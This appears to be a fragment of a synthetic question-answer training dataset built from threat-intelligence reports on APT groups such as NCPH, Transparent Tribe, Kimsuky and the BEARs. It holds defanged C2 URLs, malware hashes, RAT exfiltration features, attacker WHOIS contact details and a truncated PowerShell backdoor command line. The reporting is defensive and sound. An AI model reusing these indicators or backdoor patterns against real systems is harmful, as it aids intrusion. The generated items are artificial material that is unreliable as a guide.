GinWui.  WHG is credited by Wicked Rose as one of the authors of this malicious code. WHG is an experienced malicious code author with the following contact information:\n\uf0b7 E-mail address:\n\uf0b7 QQ Number: 312016\n\uf0b7 Website:\n\uf0b7 Real Name: May be \"Zhao Jibing\",\u8d75\u7eaa\u658c.\n\uf0b7 Location: Believed to be employed in the Sichuan province of China.\nMedium Headline: WZT\nWZT is a former member of the NCPH group who was kicked out during the time of zero-day attacks in May 2006.  WZT was removed on May 20, 2006.  During this time period the zero-day attacks became publicly disclosed, increasing pressure upon the hacking group. It is feasible that WZT may have offended the group in some way related to zero-day attack techniques, strife over hacker for hire deals, or competition for hacker for hire deals.\nWZT is a former coding expert within the NCPH group and many years experience in hacking.  He is responsible for creating multiple tools and regularly giving credit to the infamous Li0n Chinese hacker (founder of Honker Union (HUC) Chinese group. WZT maintains a website at tthacker.cublog.cn.\nMedium Headline: The Jiangsu Connection?\nWHOIS registrant data for related domains used within attacks and hacker sites reveals a connection with the Jiangsu province of China.  One domain, windowsupdates.net, is used in attacks and revolves to an IP address in the Sichuan province.  Meanwhile, the registrant \"zhaofeng network\" is reportedly based out of Jiangsu, not Sichuan.  Some of the WHOIS information clearly contains fraudulent information to presumably direct researchers away from the true identity and location of the attacker responsible for registering the hostile domain.  The connection to the Jiangsu and Sichuan provinces remains unclear.\nBig Headline: 8 Concluding Comments\nPrior to Wicked Rose and NCPH hacker for hire attacks in 2006, Chinese hackers are only known for their patriotic hacking.  This disturbing development reveals two critical threats: 1) motives of Chinese hackers are changing 2) Chinese hackers are regularly associated with sophisticated attacks as of 2006.\nWicked Rose implicates himself in his early blog entries and website posts in 2006 and prior.  An unknown company or entity reportedly paid Wicked Rose for hacking at the rate of 2,000 RMB a month, about $250 USD.  At this time Wicked Rose gave 200 RMB to NCPH hackers and kept the rest for himself.  Once targeted attacks took place the payment increased five-fold to 5,000 RMB monthly with $1,000 a month going to NCPH hackers.  This is a significant amount of money in China, effectively paying hackers a full-time wage for part-time hacking.\nThroughout the summer of 2006, while Wicked Rose was not in school, over 35 zero-day attacks, proof-of-concept codes, and attacks against un-patched Microsoft Office vulnerabilities are discovered in the wild.  With Wicked Rose claiming responsibility for early attacks and the lead author of both GinWui and the NCPH hacking group, there is little doubt left as to his involvement in attacks to date.\nBy the end of 2006 attacks become increasingly sophisticated.  In one instance a popular PowerPoint file distributed during the Christmas holiday season for the last two years prior is used within a socially engineered attack upon one individual within an energy sector US based company.  The PowerPoint file is modified to include an exploit that silently installs malicious code.  This same individual receives another e-mail containing a Microsoft Word exploit.  In this case only one individual within the company is targeted, and with just two messages socially engineered for maximum success.  This is a much more targeted and stealthy approach for attacks compared to the earlier attacks performed by the group in the late spring of 2006.\nNCPH continues to be a significant threat going forth for several reasons.\n1. Attacks continue to take place in the wild and are very difficult to identify on a targeted basis.  Only the most sophisticated networks and system administrators are able to properly protect and capture hostile targeted attack files before an attack takes place.\n2. NCPH is a serious dedicated hacking group that is methodical and disciplined in their development of new exploits and attacks.\n3. NCPH is motivated by both the thrill and challenge of hacking and money as a motive.\n4. Attacks by the group are highly targeted and stealthy, very difficult to detect and remove.\n\nQ: What role did Wicked Rose play in the NCPH group, and how did his actions impact the group's activities during 2006?",
    "output": "A: Wicked Rose served as the leader of the NCPH group, managing 'hacker for hire' relationships and paying members for their work. He claimed responsibility for targeted email-based attacks using Microsoft Word and CHM exploits in the spring of 2006. His blog entries indicated that he dropped out of school for full-time hacking opportunities and performed significant updates to his rootkit code during this period. His leadership and financial management played a crucial role in the group's activities, leading to an increase in their income and the sophistication of their attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 15DA10765B7BECFCCA3325A91D90DB37 \u2013 Special Benefits.docx\nThe remote files are two Microsoft Office documents with an embedded malicious VBA, which behaves similarly to those described in the previous article and drops the Crimson \"Thin Client\". The domain sharingmymedia[.]com was even more interesting: it was resolved with the IP 89.45.67[.]160 and was registered on 2020-01-10 using Namesilo and the following information:\nRegistrant Name: bluff hunnter\nRegistrant Organization:\nRegistrant Street: India Dehli\nRegistrant City: Dehli\nRegistrant State/Province: Delhi\nRegistrant Postal Code: 110001\nRegistrant Country: IN\nRegistrant Phone: +91.4214521212\nRegistrant Phone Ext:\nRegistrant Fax:\nRegistrant Fax Ext:\nRegistrant Email: hunterbluff007@gmail.com\nThe same information was used to register another domain, sharemydrives[.]com, which was registered seven days before, on 2020-01-03, using Namesilo. DNS resolution points to the same IP address: 89.45.67[.]160.\nUsing our Kaspersky Threat Intelligence Portal, we found the following related URL:\nMedium Headline: The code used to check if legitimate packages are installed\nThe first application on the list that is not installed on the system will be selected as the target application. The malware embeds multiple APK files, which are stored in a directory named \"assets\". The analyzed sample includes the following packages:\napk a20fc273a49c3b882845ac8d6cc5beac\napk 53cd72147b0ef6bf6e64d266bf3ccafe\napk bae69f2ce9f002a11238dcf29101c14f\napk b8006e986453a6f25fd94db6b7114ac2\napk 4556ccecbf24b2e3e07d3856f42c7072\napk 6c3308cd8a060327d841626a677a0549\nThe selected APK is copied to /.System/APK/. By default, the application tries to save the file to external storage, otherwise it saves it to the data directory.\nFinally, the application tries to install the copied APK. The final malware is a modified version of the AhMyth Android RAT, open-source malware downloadable from GitHub, which is built by binding the malicious payload inside other legitimate applications.\nThe original AhMyth RAT includes support for the following commands:\nBasically, it provides the following features:\ncamera manager (list devices and steal screenshots)\nfile manager (enumerate files and upload these to the C2)\nSMS manager (get a list of text messages or send a text)\nget the call log\nget the contact list\nmicrophone manager\nlocation manager (track the device location)\nThe RAT that we analyzed is slightly different from the original. It includes new features added by the attackers to improve data exfiltration, whereas some of the core features, such as the ability to steal pictures from the camera, are missing.\nThe operators added the following commands:\nx000upd \u2013 download a new APK from the URL specified in the \"path\" field.\nx000adm \u2013 autodownloader: not implemented in the version we analyzed, but available in other samples.\nMoreover, the creators of the RAT also improved its audio surveillance capabilities and included a command to delete text messages with specific contents.\nThe \"autodownloader\" is a method used for performing the following actions:\nupload a contact list\nupload a text message list\nupload files stored in the following directories:\n/.System/Records/\n/Download/\n/DCIM/Camera/\n/Documents/\n/WhatsApp/Media/WhatsApp Images/\n/WhatsApp/Media/WhatsApp Documents/\nThe attacker uses the method to collect contacts and text messages automatically. In addition, the method collects the following: audio files created with the \"x0000mc\" command and stored in /.System/Records/, downloaded files, photos, images and documents shared via WhatsApp and other documents stored on the device.\nAnother interesting difference between the original AhMyth and the one modified by Transparent Tribe is the technique used for getting the C2 address. The original version stores the C2 server as a string directly embedded in the code, whereas the modified version uses a different approach. It embeds another URL encoded with Base64 and used for getting a configuration file, which contains the real C2 address.\nIn our sample, the URL was as follows:\nhxxp://tryanotherhorse[.]com/config.txt\nIt provided the following content:\n212.8.240.221:5987\nhttp://www.tryanotherhorse.com\nThe first value is the real C2, which seems to be a server hosted in the Netherlands.\nThe modified version communicates via a different URL scheme, which includes more information:\nOriginal URL scheme: http://%server%:%port? model=%val%&manf=%val%&release=%val%&id=%val%\nModified URL scheme http://%server%:%port?\nmac=%val%&battery=%val%&model=%val%&manf=%val%&release=%val%&id=%val%\nBig Headline: Covid-19 tracking app\nWe found evidence of Transparent Tribe taking advantage of pandemic-tracking applications to distribute trojanized code. Specifically, we found an APK file imitating , a COVID-19 tracking mobile application developed by the National Informatics Centre under the Ministry of Electronics and Information Technology, Government of India. It allows users to connect to essential health services in India.\nThe discovered application tries to connect to the same malicious URL to get the C2 IP address: hxxp://tryanotherhorse[.]com/config.txt\nIt uses the same URL scheme described earlier and it embeds the following APK packages:\napk CF71BA878434605A3506203829C63B9D\napk 627AA2F8A8FC2787B783E64C8C57B0ED\napk 62FAD3AC69DB0E8E541EFA2F479618CE\napk A912E5967261656457FD076986BB327C\napk 3EB36A9853C9C68524DBE8C44734EC35\napk 931435CB8A5B2542F8E5F29FD369E010\nInterestingly enough, at the end of April, the Indian Army issued a warning to its personnel against Pakistani agencies' nefarious designs to hack the phones of Indian military personnel through a malicious application similar to Aarogya Setu.\nAccording to some Indian online , these applications were found to be sent by Pakistani Intelligence Operatives to WhatsApp groups of Indian Army personnel. It also mentioned that these applications later deployed additional packages:\nAccording to some Indian online news sites, these applications were found to be sent by Pakistani Intelligence Operatives to WhatsApp groups of Indian Army personnel. It also mentioned that these applications later deployed additional packages:\nface.apk\nimo.apk\nnormal.apk\ntrueC.apk\nsnap.apk\nviber.apk\nBased on public information, the application may have been distributed by sending a malicious link via WhatsApp, SMS, phishing email or social media.\nBig Headline: IoC\nThe followings IoC list is not complete. If you want more information about the APT discussed here, a full IoC list and YARA rules are available to customers of Kaspersky Threat Intelligence Reports. Contact:\n15DA10765B7BECFCCA3325A91D90DB37 \u2013 Special Benefits.docx 48476DA4403243B342A166D8A6BE7A3F \u2013 7All_Selected_list.xls B3F8EEE133AE385D9C7655AAE033CA3E \u2013 Criteria of Army Officers.doc D7D6889BFA96724F7B3F951BC06E8C02 \u2013 wifeexchange.exe\n0294F46D0E8CB5377F97B49EA3593C25 \u2013 Android Dropper \u2013 Desi-porn.apk 5F563A38E3B98A7BC6C65555D0AD5CFD \u2013 Android Dropper \u2013 Aarogya Setu.apk A20FC273A49C3B882845AC8D6CC5BEAC \u2013 Android RAT \u2013 face.apk 53CD72147B0EF6BF6E64D266BF3CCAFE \u2013 Android RAT \u2013 imo.apk BAE69F2CE9F002A11238DCF29101C14F \u2013 Android RAT \u2013 normal.apk B8006E986453A6F25FD94DB6B7114AC2 \u2013 Android RAT \u2013 snap.apk 4556CCECBF24B2E3E07D3856F42C7072 \u2013 Android RAT \u2013 trueC.apk 6C3308CD8A060327D841626A677A0549 \u2013 Android RAT \u2013 viber.apk CF71BA878434605A3506203829C63B9D \u2013 Android RAT \u2013 face.apk 627AA2F8A8FC2787B783E64C8C57B0ED \u2013 Android RAT \u2013 imo.apk 62FAD3AC69DB0E8E541EFA2F479618CE \u2013 Android RAT \u2013 normal.apk A912E5967261656457FD076986BB327C \u2013 Android RAT \u2013 snap.apk 3EB36A9853C9C68524DBE8C44734EC35 \u2013 Android RAT \u2013 trueC.apk 931435CB8A5B2542F8E5F29FD369E010 \u2013 Android RAT \u2013 viber.apk\nhxxp://sharingmymedia[.]com/files/Criteria-of-Army-Officers.doc hxxp://sharingmymedia[.]com/files/7All-Selected-list.xls hxxp://sharemydrives[.]com/files/Laptop/wifeexchange.exe hxxp://sharemydrives[.]com/files/Mobile/Desi-Porn.apk\nhxxp://tryanotherhorse[.]com/config.txt \u2013 APK URL\n212.8.240[.]221:5987 \u2013 Android RAT C2\nhxxp://212.8.240[.]221:80/server/upload.php \u2013 URL used by Android RAT to upload files\n\nWhat techniques does Transparent Tribe employ to distribute their malicious Android implants, and how do they leverage legitimate applications to disguise their activities?",
    "output": "A: Transparent Tribe distributes their malicious Android implants by embedding them within legitimate applications. The malware selects the first application on a predefined list that is not installed on the target system and copies the corresponding APK to the device. The malware then attempts to install the copied APK. This technique allows the attackers to disguise their activities by making the installation appear legitimate. For example, the group has used this method to distribute a trojanized version of the Aarogya Setu COVID-19 tracking app, which is a legitimate application developed by the Indian government. Additionally, the group has used porn-related apps to entice users into installing the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Non-US Foreign Allegations\nThe US is not alone in accusing China of using cyber warfare. In 2007 and 2008, China was publicly accused of hacking into government facilities by officials in Australia, France, Germany, India, Japan, New Zealand, South Korea, and the UK (Basu 2008; Goodin 2008; Ha 2008; Leyden 2007; Marquand 2007). The number of countries under Chinese attack could be far greater as some may not know that they are under attack, may not wish to reveal their weakness due to a loss of soft power and consumer confidence, or they do not wish to upset China as a valuable trading partner. Hans Elmar Remberg, Vice President of the German Office for the Protection of the Constitution (Germany's domestic intelligence agency) stated that \"across the world the PRC is intensively gathering political, military, corporate-strategic and scientific information in order to bridge their technological gaps as quickly as possible\" (Tkacik 2007).\nUnlike HUMINT, cyber warfare provides a lack of definitive attribution, makes distance nearly irrelevant, allows for the mass accumulation of data in a short span of time, and at a small cost in comparison to traditional espionage or military activities.  Cyber attacks, such as an incident that shut down the UK House of Commons, may only be small scale test runs, probing, or reconnaissance blunders, meaning that the true scope of cyber attack has yet to be seen (Norton-Taylor 2007). Cyber reconnaissance appears to be the most beneficial tool of cyber warfare. Beyond finding exploitation points in the military for future attack, the commercial sector allows China the opportunity to skip generations of research and development efforts, levelling the playing field in science and technology, and by association boosting economic and military might. Chinese hackers have even gone after British parliamentiary files on human rights issues, showing a potential interest in relation to soft power, globalization, international condemnation, and the legal apparatus. As Unrestricted Warfare has shown, there are no boundaries in relation to such military operations.\nBig Headline: 4. Case Studies: Estonia, Georgia and Chanology\nThe 2007 cyber attacks against Estonia, Georgia and Project Chanology are examples of large-scale cyber attacks. The Estonian attacks were the first to show how cyber attack against a state provides a debilitating effect at a low cost, a lack of attribution, a lack of legal framework in defence, world-wide attention, and may point to a new arm of traditional attack. The Russo-Georgian war of August 2008 was even more sophisticated and intense than the Estonian case, showing the maturation of the process. Project Chanology reveals how the collective masses can use online tools to emerge as a powerful force without a central leadership. This can be harnessed by military power through the tactics described in IO (Information Operations, see above). And as a matter of internal security, Chanology-style movements must be carefully observed as they pose a non-traditional threat. Estonia and Chanology are an emerging expression of warfare that is fuelled by new powers afforded by the internet, but spills over into the real world, not only through financial loss and media coverage (soft power), but also in the form of volatile protests, disruption, mob mentality, and the capability of drawing governments and militaries into unwanted actions.\nMedium Headline: Estonia\nIn 2007, the Estonian government relocated a Soviet-era war memorial and bronze statue in Tallinn, stating that the memorial symbolised Soviet occupation. The Russian government condemned the relocation, claiming it was a tribute to those who fought in World War II. The relocation sparked protests which resulted in 150 injuries, one death, and a month-long cyber war campaign. Estonian websites including parliament, banks, ministries, schools, and newspaper outlets were attacked with DDoS attacks and web page defacements. Some websites also redirected users to images of Soviet soldiers and quotations from Martin Luther King about resisting evil. Hackers who hit the ruling Reform Party's website left a fake message that the Estonian prime minister and his government were asking for Russian forgiveness and promising to return the statue to its original site (The Cyber Raiders Hitting Estonia 2007).\nThese attacks garnered world-wide attention. The Russian government was directly accused by media outlets and the Estonian Prime Minister Andrus Ansip. Russia had the motive and the means for such an attack. However, there was no direct evidence to suggest that the attacks were state-sponsored. There was evidence that some of the IP addresses used in the attacks belonged to Russian government officials, and instructions on how to carry out cyber warfare did circulate on Russian websites. However, the source of DDoS attacks could have been masked by using proxies or botnets that are located across the globe. Neither NATO nor European Commission experts were able to find any proof of official Russian government participation. Further, the Russian government denounced Estonia's claims and refused to participate in any type of investigation (Bright 2007; Estonia Fines Man for 'Cyber War' 2008; Estonia Hit by Moscow Cyber War 2007).\nMedium Headline: Debilitating Effect at a Low Cost\nThe effects of the cyber attacks were magnified as Estonia is one of the most internet-savvy states in the European Union (The Cyber Raiders Hitting Estonia 2007). The Estonian government has pursued a paperless society, or e-government, and web-based banking. Slowing down, or halting, banking services and newspaper outlets that rely on advertising revenue strains the economy. This happens not only through a direct loss in revenue, but also with a reduction in productivity, lost efficiency, diverting resources, escalating frustration, and lost consumer and investor confidence. Estonia also uses the internet to elect parliamentary officials, file their taxes and, via mobile phone, shop or pay for parking. In some cases, website administrators simply blocked access from foreign states. While this was effective in curbing the attacks, it completely cut off banking services to Estonians outside of the country, vital to Estonian business people abroad. Spam emails inundated government officials' inboxes, halting online communication from the Parliament's email server. Officials closed off large portions of their network to keep more vital areas online. A government briefing site was given high priority while the president's website was sacrificed. The 10 largest swarms of data requests by the hackers absorbed 90 megabits per second for up to 10 hours each, straining Estonia's networks. It was 'equivalent to downloading the entire Windows XP operating system every six seconds for 10 hours' (Landler and Markoff 2007). The cyber attacks on Estonia came close to shutting down the country's digital infrastructure. While these may seem more of a disruption than a collapse, the effects radiate out into society (Bright 2007; Estonia Hit by Moscow Cyber War 2007).\nThe month-long campaign caused companies to put resources into alternative infrastructure, such as going back to traditional mail, relying on telephones, fax, and libraries, and re-enforcing alternative methods of payment. As well as the cost of material infrastructure, these type of cyber attacks cause a loss in productivity. This includes paying more people to staff bank tellers, increased traffic on the streets, and long lines at retail outlets. Newspaper outlets, telephone companies, and product distributors, have grown accustomed to using online tools, and now rely heavily on them. While this might be a boon for some industries, the whole restructuring process weakens the nation in the short term. The cyber attacks are comparable to the damage caused to industry (beyond tangible infrastructure) by flooding or blizzards. It places a nation in a state of flux, and leaves it more vulnerable to a traditional attack.\nDDoS attacks offer an enemy country an effective low cost assault with high deniability.  The majority of attacks on Estonia were DDoS, clogging its servers, switches, and routers. Analysis from Arbor Networks revealed thousands of bots were used against Estonia from locations as diverse as the US, Vietnam, Peru, and China. The cost to a state wanting to establish botnets is minimal, requiring only one person, an internet connection, and a basic computer. While the information for conducting such attacks can be found online, it is more likely someone with expertise, such as non-government hacker groups, would be involved in securing the rental of a botnet. This still keeps the number at a minimum, and hackers can find alternative ways to fund the rental of servers with high bandwidth, such as credit card theft (Waterman 2007; The Cyber Raiders Hitting Estonia 2007).\n\nAnswer this question based on the above context: Why might some countries choose not to publicly acknowledge being victims of Chinese cyber attacks, and what implications does this have for global cybersecurity?",
    "output": "Some countries may choose not to publicly acknowledge being victims of Chinese cyber attacks for several reasons. They might not realize they are under attack, wish to avoid revealing their weaknesses due to a loss of soft power and consumer confidence, or prefer not to upset China as a valuable trading partner. This lack of transparency has significant implications for global cybersecurity. It hinders the ability to assess the true scope and impact of cyber attacks, making it harder to develop effective countermeasures and international cooperation. Additionally, it allows perpetrators to continue their activities with impunity, further exacerbating the cybersecurity landscape.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What was the second stage payload delivered by the XLSM attachments, and what were the key configurations and parameters of this payload?",
    "output": "The second stage payload delivered by the XLSM attachments was a typical Cobalt Strike BEACON payload. This payload was configured with specific parameters, including process injection targets such as %windir%\\syswow64\\rundll32.exe and %windir%\\sysnative\\rundll32.exe. The payload also used custom user agents, named pipes, and a beacon interval of 60 seconds. The command and control (C2) servers were configured to autodiscover.2bunny[.]com and sfo02s01-in-f2.cloudsend[.]net, with TCP port 80 being used for communication.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What were the key differences in the types of threats encountered in India and Turkey compared to the global mix, and which specific threats were targeted at these regions?",
    "output": "The mix of threats encountered in India and Turkey were largely similar to the worldwide mix, but each location also reported significant encounters with a threat that appeared to be strongly targeted at a specific region. The worm family MSIL/Mofin was unusually common in India, where more than 85 percent of all Mofin encounters occurred in 1H15. Similarly, the trojan family Win32/BeeVry was unusually common in Turkey, where more than 98 percent of all BeeVry encounters occurred in 1H15.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ThreatConnect reviews activity targeting Bellingcat, a key contributor in the MH17 investigation.\nIntroduction\nSince posting about the (<https://threatconnect.com/blog/tapping-into-democratic-national-committee/>)DNC hack, each time we published a blog post on a BEAR-based topic we thought it was going to be our last. But like the Death Star's gravitational pull, the story keeps drawing us back in as new information comes to light. Following our post on (<https://threatconnect.com/blog/does-a-bear-leak-in-the-woods/>)DCLeaks as a Russian influence operation, (<https://www.bellingcat.com/>)Bellingcat founder (<https://www.bellingcat.com/author/eliothiggins/>)Eliot Higgins reached out to us. Bellingcat, a group of citizen investigative journalists, has published articles critical of Russia and has been a key contributor to the international investigation of the shootdown of (<https://en.wikipedia.org/wiki/Malaysia_Airlines_Flight_17>)Malaysian Airlines Flight 17 (MH17) over Ukraine in 2014.\nHiggins shared data with ThreatConnect that indicates Bellingcat has come under sustained targeting by Russian threat actors, which allowed us to identify a 2015 spearphishing campaign that is consistent with FANCY BEAR's tactics, techniques, and procedures. We also analyzed a February 2016 attack by CyberBerkut \u2014 a group claiming to be pro-Russian Ukrainian hacktivists but also a suspected front for Moscow \u2014 against Russia-based Bellingcat contributor (<https://twitter.com/RuslanLeviev>)Ruslan Leviev, where (<https://threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/>)CyberBerkut defaced the Bellingcat website and leaked Leviev's personal details. As evidenced by these efforts and the attack on the World Anti-Doping Agency, organizations that negatively impact Russia's image can expect Russian cyber operations intended to retaliate publicly or privately, influence, or otherwise maliciously affect them. The (<http://www.activeresponse.org/the-diamond-model/>)Diamond Model below summarizes the activity that Bellingcat experienced.\nQ: How did the tactics, techniques, and procedures (TTPs) employed by FANCY BEAR in the 2015 spearphishing campaign against Bellingcat align with their typical modus operandi? Additionally, what insights can be drawn from the attack on Bellingcat contributor Ruslan Leviev by CyberBerkut in February 2016 regarding the broader strategy of Russian cyber operations?",
    "output": "The 2015 spearphishing campaign against Bellingcat was consistent with FANCY BEAR's known TTPs, indicating a pattern of targeted and sophisticated attacks aimed at compromising high-value targets. This consistency underscores the threat actor's ability to leverage advanced techniques to infiltrate and gather sensitive information. Furthermore, the attack on Ruslan Leviev by CyberBerkut, which involved defacing the Bellingcat website and leaking personal details, highlights a broader strategy of Russian cyber operations. These operations are designed to retaliate against organizations that negatively impact Russia's image, either through public shaming or private influence. Such actions demonstrate the multifaceted approach of Russian threat actors, combining both technical prowess and psychological warfare to achieve their objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. Overview\nThe Kimsuky threat group, deemed to be supported by North Korea, has been active since 2013. At first, they attacked North Korea-related research institutes in South Korea before attacking a South Korean energy corporation in 2014. Cases of attacks against countries other than South Korea have also been identified since 2017. (<https://atip.ahnlab.com/ti/contents/threat-actor/detail?tagSeq=15>)[1] The group usually employs spear phishing attacks against the national defense sector, defense industries, the press, the diplomatic sector, national organizations, and academic fields to steal internal information and technology from organizations. (<https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=31442>)[2] (This link is only available in Korean.)\nEven until recently, the Kimsuky group was still mainly employing spear phishing attacks to gain initial access. What makes the recent attacks different from the previous cases is that more LNK shortcut-type malware are being used instead of malware in Hangul Word Processor (HWP) or MS Office document format. The threat actor led users to download a compressed file through attachments or download links within spear phishing emails. When this compressed file is decompressed, it yields a legitimate document file along with a malicious LNK file.\nASEC is monitoring the Kimsuky group's attacks using LNK-type malware and is continuously posting identified cases of attacks on the ASEC Blog. The Kimsuky group installs remote control malware to control the infected system after completing such steps to\ngain initial access. Malware used by the Kimsuky group not only include custom-made such as AppleSeed and PebbleDash (<https://asec.ahnlab.com/en/30532/>)[3], but also open-source or commercial malware such as XRat (<https://asec.ahnlab.com/en/31089/>)[4], HVNC (<https://asec.ahnlab.com/en/27346/>)[5], Amadey (<https://asec.ahnlab.com/en/40483/>)[6], and Metasploit Meterpreter (<https://asec.ahnlab.com/en/53046/>)[7]. After gaining control, the threat actor ultimately uses RDP or installs Google's Chrome Remote Desktop (<https://asec.ahnlab.com/en/55145/>)[8] to exfiltrate information from the infected system.\nHere we analyze Amadey and RftRAT which were recently found being distributed. Amadey and RftRAT were constantly used throughout 2023 alongside XRat. However, recent types showed that they were created with AutoIt. This post also covers Infostealers additionally installed by the Kimsuky group using remote control malware. While remote control-type malware continuously change, the malware installed through these have not changed much in the attacks in 2023.\n\nBased on the above text, answer a question. Why did the Kimsuky threat group shift from using HWP or MS Office document format malware to LNK shortcut-type malware in their recent spear phishing attacks? How does this change affect the initial access strategy of the group?",
    "output": "The Kimsuky group shifted to using LNK shortcut-type malware instead of HWP or MS Office document format malware to gain initial access. This change involves leading users to download a compressed file through attachments or download links within spear phishing emails. When decompressed, the file contains a legitimate document file along with a malicious LNK file. This strategy allows the threat actor to exploit user trust in legitimate documents while delivering the malicious payload more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBears in the Midst: Intrusion into the Democratic National Committee\nDmitri Alperovitch\nThere is rarely a dull day at CrowdStrike where we are not detecting or responding to a breach at a company somewhere around the globe. In all of these cases, we operate under strict confidentiality rules with our customers and cannot reveal publicly any information about these attacks. But on rare occasions, a customer decides to go public with information about their incident and give us permission to share our knowledge of the adversary tradecraft with the broader community and help protect even those who do not happen to be our customers. This story is about one of those cases.\nCrowdStrike Services Inc., our Incident Response group, was (<https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html>)called by the Democratic National Committee (DNC), the formal governing body for the US Democratic Party, to respond to a suspected breach. We deployed our IR team and (<https://www.crowdstrike.com/products/falcon-host/>)technology and immediately identified two sophisticated adversaries on the network \u2013 COZY BEAR and FANCY BEAR. We've had lots of experience with both of these actors attempting to target our customers in the past and know them well. In fact, our team considers them some of the best adversaries out of all the numerous nation-state, criminal and hacktivist/terrorist groups we encounter on a daily basis. Their tradecraft is superb, operational security second to none and the extensive usage of 'living-off-the-land' techniques enables them to easily bypass many security solutions they encounter. In particular, we identified advanced methods consistent with nation-state level capabilities including deliberate targeting and 'access management' tradecraft \u2013 both groups were constantly going back into the environment to change out their implants, modify persistent methods, move to new Command & Control channels and perform other tasks to try to stay ahead of being detected. Both adversaries engage in extensive political and economic espionage for the benefit of the government of the Russian Federation and are believed to be closely linked to the Russian government's powerful and highly capable intelligence services.\nCOZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated the unclassified networks of the (<http://www.thedailybeast.com/articles/2015/04/08/obama-to-putin-stop-hacking-me.html>)White House, (<http://www.cnn.com/2015/03/10/politics/state-department-hack-worst-ever/>)State Department, and (<https://www.theguardian.com/technology/2015/aug/06/us-military-joint-chiefs-hacked-officials-blame-russia>)US Joint Chiefs of Staff. In addition to the US government, they have targeted organizations across the Defense, Energy, Extractive, Financial, Insurance, Legal, Manufacturing Media, Think Tanks, Pharmaceutical, Research and Technology industries, along with Universities. Victims have also been observed in Western Europe, Brazil, China, Japan, Mexico, New Zealand, South Korea, Turkey and Central Asian countries. COZY BEAR's preferred intrusion method is a broadly targeted spearphish campaign that typically includes web links to a malicious dropper. Once executed on the machine, the code will deliver one of a number of sophisticated Remote Access Tools (RATs), including AdobeARM, ATI-Agent, and MiniDionis. On many occasions, both the dropper and the payload will contain a range of techniques to ensure the sample is not being analyzed on a virtual machine, using a debugger, or located within a sandbox. They have extensive checks for the various security software that is installed on the system and their specific configurations. When specific versions are discovered that may cause issues for the RAT, it promptly exits. These actions demonstrate a well-resourced adversary with a thorough implant-testing regime that is highly attuned to slight configuration issues that may result in their detection, and which would cause them to deploy a different tool instead. The implants are highly configurable via encrypted configuration files, which allow the adversary to customize various components, including C2 servers, the list of initial tasks to carry out, persistence mechanisms, encryption keys and others. An HTTP protocol with encrypted payload is used for the Command & Control communication.\nFANCY BEAR (also known as Sofacy or APT 28) is a separate Russian-based threat actor, which has been active since mid 2000s, and has been responsible for targeted intrusion campaigns against the Aerospace, Defense, Energy, Government and Media sectors. Their victims have been identified in the United States, Western Europe, Brazil, Canada, China, Georgia, Iran, Japan, Malaysia and South Korea. Extensive targeting of defense ministries and other military victims has been observed, the profile of which closely mirrors the strategic interests of the Russian government, and may indicate affiliation with \u0413\u043b\u0430\u0432\u043d\u043e\u0435 \u0420\u0430\u0437\u0432\u0435\u0434\u044b\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 (Main Intelligence Department) or GRU, Russia's premier military intelligence service. This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRange droppers, and even malware for Linux, OSX, IOS, Android and Windows Phones. This group is known for its technique of registering domains that closely resemble domains of legitimate organizations they plan to target. Afterwards, they establish phishing sites on these domains that spoof the look and feel of the victim's web-based email services in order to steal their credentials. FANCY BEAR has also been linked publicly to intrusions into the (<http://www.ft.com/cms/s/0/668a131e-1928-11e6-b197-a4af20d5575e.html>)German Bundestag and (<http://www.bbc.com/news/world-europe-33072034>)France's TV5 Monde TV station in April 2015.\nAt DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016. We have identified no collaboration between the two actors, or even an awareness of one by the other. Instead, we observed the two Russian espionage groups compromise the same systems and engage separately in the theft of identical credentials. While you would virtually never see Western intelligence agencies going after the same target without de-confliction for fear of compromising each other's operations, in Russia this is not an uncommon scenario. (<http://www.ecfr.eu/publications/summary/putins_hydra_inside_russias_intelligence_services>)\"Putin's Hydra: Inside Russia's Intelligence Services\", a recent paper from European Council on Foreign Relations, does an excellent job outlining the highly adversarial relationship between Russia's main intelligence services \u2013 \u0424\u0435\u0434\u0435\u0440\u0430\u043b\u044c\u043d\u0430\u044f \u0421\u043b\u0443\u0436\u0431\u0430 \u0411\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438 (FSB), the primary domestic intelligence agency but one with also significant external collection and 'active measures' remit, \u0421\u043b\u0443\u0436\u0431\u0430 \u0412\u043d\u0435\u0448\u043d\u0435\u0439 \u0420\u0430\u0437\u0432\u0435\u0434\u043a\u0438 (SVR), the primary foreign intelligence agency, and the aforementioned GRU. Not only do they have overlapping areas of responsibility, but also rarely share intelligence and even occasionally steal sources from each other and compromise operations. Thus, it is not surprising to see them engage in intrusions against the same victim, even when it may be a waste of resources and lead to the discovery and potential compromise of mutual operations.\nThe COZY BEAR intrusion relied primarily on the SeaDaddy implant developed in Python and compiled with py2exe and another Powershell backdoor with persistence accomplished via Windows Management Instrumentation (WMI) system, which allowed the adversary to launch malicious code automatically after a specified period of system uptime or on a specific schedule. The Powershell backdoor is ingenious in its simplicity and power. It consists of a single obfuscated command setup to run persistently, such as:\npowershell.exe -NonInteractive -ExecutionPolicy Bypass 